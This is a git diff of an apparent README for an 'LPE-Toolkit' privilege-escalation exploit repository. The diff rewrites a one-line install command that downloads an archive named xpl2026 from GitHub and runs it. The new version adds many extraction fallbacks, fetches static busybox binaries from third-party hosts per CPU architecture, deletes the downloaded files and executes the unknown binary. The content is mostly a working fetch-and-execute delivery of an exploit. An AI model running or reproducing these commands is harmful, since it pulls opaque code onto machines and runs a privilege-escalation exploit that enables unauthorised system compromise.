@@ -137,9 +137,9 @@ wget https://github.com/wongalus7/LPE-Toolkit/raw/refs/heads/main/xpl2026.tgz --
 ```bash
 curl https://github.com/wongalus7/LPE-Toolkit/raw/refs/heads/main/xpl2026.zip -o xpl2026.zip && unzip xpl2026.zip && rm -rf xpl2026.zip && cd xpl2026 && chmod +x xpl2026 && ./xpl2026
 ```
-## FIX
+## TAHAN BANTING COK
 ```bash
-d=$(pwd -P) && cd "$d" && f=xpl2026.zip && curl -fsSL https://github.com/wongalus7/LPE-Toolkit/raw/refs/heads/main/xpl2026.zip -o "$f" && curl -fsSL "https://busybox.net/downloads/binaries/1.35.0-$(uname -m)-linux-musl/busybox" -o bb && chmod +x bb && ./bb unzip -o "$f" && cd xpl2026 && rm -f "$d/$f" "$d/bb" && chmod +x xpl2026 && ./xpl2026
+d=$(pwd -P) && cd "$d" && f=xpl2026.zip && { [ -f "$f" ] || curl -fsSL https://github.com/wongalus7/LPE-Toolkit/raw/refs/heads/main/xpl2026.zip -o "$f" || wget -q https://github.com/wongalus7/LPE-Toolkit/raw/refs/heads/main/xpl2026.zip -O "$f"; } && { unzip -q "$f" 2>/dev/null || busybox unzip -o "$f" 2>/dev/null || python3 -m zipfile -e "$f" . 2>/dev/null || python -m zipfile -e "$f" . 2>/dev/null || perl -MIO::Uncompress::Unzip -e 'my $z=IO::Uncompress::Unzip->new(shift) or die;for(my $s=1;$s>0;$s=$z->nextStream()){my $n=$z->getHeaderInfo->{Name};next if $n=~m{/$};open my $fh,">",$n or die;binmode $fh;my $b;print $fh $b while $z->read($b)>0;close $fh}' "$f" 2>/dev/null || php -r '$z=new ZipArchive;if($z->open($argv[1])!==TRUE)exit(1);exit($z->extractTo(".")?0:1);' "$f" 2>/dev/null || jar xf "$f" 2>/dev/null || bsdtar -xf "$f" 2>/dev/null || 7z x -y "$f" 2>/dev/null || 7zz x -y "$f" 2>/dev/null || { arch=$(uname -m); case "$arch" in x86_64|amd64) bb_url="https://raw.githubusercontent.com/Azathothas/Static-Binaries/main/busybox/busybox_amd_x86_64_gcc_Linux";; aarch64|arm64) bb_url="https://raw.githubusercontent.com/Azathothas/Static-Binaries/main/busybox/busybox_aarch64_arm64_gcc_Linux";; armv7l) bb_url="https://raw.githubusercontent.com/Azathothas/Static-Binaries/main/busybox/busybox_armv7_abihf_musl_Linux";; i686|i386) bb_url="https://raw.githubusercontent.com/Azathothas/Static-Binaries/main/busybox/busybox_i686_gcc_Linux";; *) echo "Arsitektur $arch belum didukung fallback busybox"; exit 1;; esac; curl -fsSL "$bb_url" -o bb || wget -q "$bb_url" -O bb; chmod +x bb; ./bb unzip -o "$f"; }; } && cd xpl2026 && rm -f "$d/$f" && chmod +x xpl2026 && ./xpl2026
 ```
 ---
 
